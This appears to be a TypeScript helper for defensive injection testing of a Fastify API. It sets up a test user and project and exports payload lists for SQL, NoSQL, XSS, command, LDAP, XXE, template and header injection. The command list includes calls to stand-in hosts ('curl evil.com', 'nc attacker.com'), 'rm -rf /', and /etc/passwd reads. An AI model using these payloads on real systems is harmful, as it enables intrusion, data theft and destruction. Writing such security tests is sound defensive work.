import type { FastifyInstance } from "fastify";

export interface InjectionTestContext {
  app: FastifyInstance;
  prisma: null;
  authToken: string;
  testProjectId: string;
}

export async function setupInjectionTestContext(): Promise<InjectionTestContext> {
  const { createApp } = await import("../../apps/api/src/index.js");
  const app = await createApp();
  await app.ready();

  const email = `injection-test-${Date.now()}@example.com`;

  const registerResponse = await app.inject({
    method: "POST",
    url: "/api/auth/register",
    payload: {
      email,
      password: "SecureP@ssw0rd123!",
      name: "Injection Test User",
    },
  });

  // Get the actual email from the register response if available
  let actualEmail = email;
  if (registerResponse.statusCode === 201 || registerResponse.statusCode === 200) {
    const registerBody = JSON.parse(registerResponse.body);
    actualEmail = registerBody.value?.email || registerBody.data?.email || email;
  }

  const loginResponse = await app.inject({
    method: "POST",
    url: "/api/auth/login",
    payload: {
      email: actualEmail,
      password: "SecureP@ssw0rd123!",
    },
  });

  const loginBody = JSON.parse(loginResponse.body);
  const authToken = loginBody.token || loginBody.value?.token || "";

  let testProjectId = "";

  if (authToken) {
    const projectResponse = await app.inject({
      method: "POST",
      url: "/api/projects",
      headers: {
        authorization: `Bearer ${authToken}`,
      },
      payload: {
        name: "Injection Test Project",
        description: "Test project for injection testing",
      },
    });

    const projectBody = JSON.parse(projectResponse.body);
    testProjectId = projectBody.value?.id || projectBody.data?.id || "";
  }

  return { app, prisma: null, authToken, testProjectId };
}

export async function teardownInjectionTestContext(ctx: InjectionTestContext): Promise<void> {
  await ctx.app?.close();
}

export const sqlInjectionPayloads = [
  "' OR '1'='1",
  "' OR 1=1 --",
  "' OR 'a'='a",
  "') OR ('1'='1",
  "' UNION SELECT NULL,NULL,NULL --",
  "' UNION SELECT username,password FROM users --",
  "' UNION SELECT @@version --",
  "' AND (SELECT COUNT(*) FROM users) > 0 --",
  "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE email='admin@example.com') = 'a' --",
  "'; WAITFOR DELAY '00:00:05' --",
  "'; SELECT SLEEP(5) --",
  "' AND (SELECT COUNT(*) FROM users) > 0 AND SLEEP(5) --",
  "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) --",
  "'; DROP TABLE posts; --",
  "'; INSERT INTO posts (title) VALUES ('hacked'); --",
  "'; UPDATE users SET role='admin' WHERE id=1; --",
  "' OR 1=1#",
  "' OR 1=1/*",
  "%27%20OR%201=1--",
  "' OR 1=1%00",
  "admin'--",
];

export const noSqlInjectionPayloads = [
  { $ne: null },
  { $gt: "" },
  { $lt: "z" },
  { $regex: ".*" },
  { $where: "function() { return true; }" },
  { $exists: true },
  { $in: ["admin", "test", "user"] },
  { $nin: ["blocked"] },
  { $all: ["test"] },
  { $size: 1 },
  { $or: [{ email: "admin@example.com" }, { email: { $ne: null } }] },
  { $and: [{ role: "admin" }, { status: { $ne: "disabled" } }] },
  { $where: 'this.email.indexOf("@") > 0' },
  { $where: 'function() { return this.role === "admin"; }' },
  { $type: 2 },
  { $mod: [2, 0] },
];

export const xssPayloads = [
  '<script>alert("xss")</script>',
  '<img src=x onerror=alert("xss")>',
  '<svg onload=alert("xss")>',
  '<input onfocus=alert("xss") autofocus>',
  '<select onfocus=alert("xss") autofocus>',
  '<textarea onfocus=alert("xss") autofocus>',
  '<keygen onfocus=alert("xss") autofocus>',
  "<video><source onerror=\"alert('xss')\">",
  '<audio src=x onerror=alert("xss")>',
  'javascript:alert("xss")',
  'JAVASCRIPT:alert("xss")',
  'JaVaScRiPt:alert("xss")',
  'data:text/html,<script>alert("xss")</script>',
  "data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4=",
  '<body onload=alert("xss")>',
  '<div onclick=alert("xss")>click me</div>',
  '<button onmouseover=alert("xss")>hover me</button>',
  "<div style=\"background:url(javascript:alert('xss'))\">",
  "<div style=\"expression(alert('xss'))\">",
  '<meta http-equiv="refresh" content="0;url=javascript:alert(\'xss\')">',
  '<link rel="stylesheet" href="javascript:alert(\'xss\')">',
  "<object data=\"javascript:alert('xss')\">",
  "<embed src=\"javascript:alert('xss')\">",
  '<form action="javascript:alert(\'xss\')"><input type="submit"></form>',
  "<iframe src=\"javascript:alert('xss')\"></iframe>",
  '<svg><script>alert("xss")</script></svg>',
  "<svg onload=\"alert('xss')\">",
  '<scr<script>ipt>alert("xss")</scr</script>ipt>',
];

export const commandInjectionPayloads = [
  "; ls -la",
  "| whoami",
  "&& cat /etc/passwd",
  "|| id",
  "$(id)",
  "`cat /etc/passwd`",
  "$(curl evil.com)",
  "`wget evil.com/malware`",
  "| nc attacker.com 8080",
  "| curl evil.com",
  "| wget evil.com",
  "; sleep 10 &",
  "& rm -rf /",
  "; cat /etc/passwd",
  "; ls -la /",
  '; find / -name "*.key"',
  "; netstat -an",
  "; ps aux",
  "; ifconfig",
  "; uname -a",
  "; id",
  "; whoami",
  "%3B%20ls%20-la",
  "%7C%20whoami",
  "& dir",
  "&& net user",
  "; ls -la $(pwd)",
  '| grep -r "password" /',
];

export const ldapInjectionPayloads = [
  "*)(uid=*",
  "*)(|(objectClass=*))",
  "*)(&(objectClass=user)(uid=admin))",
  "*",
  "**",
  "***",
  "*))(|(cn=*",
  "*))%00",
  "*(|(&",
  "*))(|(mail=*))",
  "*))(|(sn=*))",
  "*)(uid=admin)(|(uid=*",
  "*)(|(uid=admin))",
  "\\*",
  "\\(",
  "\\)",
  "%2A%29%28uid%3D%2A",
  "*)(uid=admin)#",
];

export const xmlInjectionPayloads = [
  `<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [<!ELEMENT foo ANY>
   <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
   <foo>&xxe;</foo>`,

  `<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [<!ELEMENT foo ANY>
   <!ENTITY xxe SYSTEM "http://evil.com/evil">]>
   <foo>&xxe;</foo>`,

  `<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [<!ELEMENT foo ANY>
   <!ENTITY % xxe SYSTEM "file:///etc/passwd">
   %xxe;]>
   <foo>test</foo>`,

  `<?xml version="1.0"?>
   <data><![CDATA[
   <script>alert('xss')</script>
   ]]></data>`,

  `<?xml version="1.0"?>
   <?xml-stylesheet type="text/xsl" href="http://evil.com/evil.xsl"?>
   <data>test</data>`,
];

export const templateInjectionPayloads = [
  "{{7*7}}",
  "{{config}}",
  "{{request}}",
  "{{7*7}}",
  "{{dump(app)}}",
  "{{#each constructor}}{{@key}}{{/each}}",
  '${"freemarker.template.utility.Execute"?new()("id")}',
  '<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}',
  "{php}echo `id`;{/php}",
  '<%= system("id") %>',
  "<%= `id` %>",
  '<%= File.open("/etc/passwd").read %>',
  '@(System.Diagnostics.Process.Start("cmd.exe","/c id"))',
  '@Html.Raw("<script>alert(1)</script>")',
  "#{7*7}",
];

export const headerInjectionPayloads = [
  "test\r\nSet-Cookie: admin=true",
  "test\r\nLocation: http://evil.com",
  'test\n\nHTTP/1.1 200 OK\nContent-Type: text/html\n\n<script>alert("xss")</script>',
  'test\r\nContent-Type: text/html\r\n\r\n<html><script>alert("xss")</script></html>',
  "test%0d%0aSet-Cookie:%20admin=true",
  "test%0ASet-Cookie:%20admin=true",
  "test%0D%0ALocation:%20http://evil.com",
  "test\u2028Set-Cookie: admin=true",
  "test\u2029Location: http://evil.com",
];
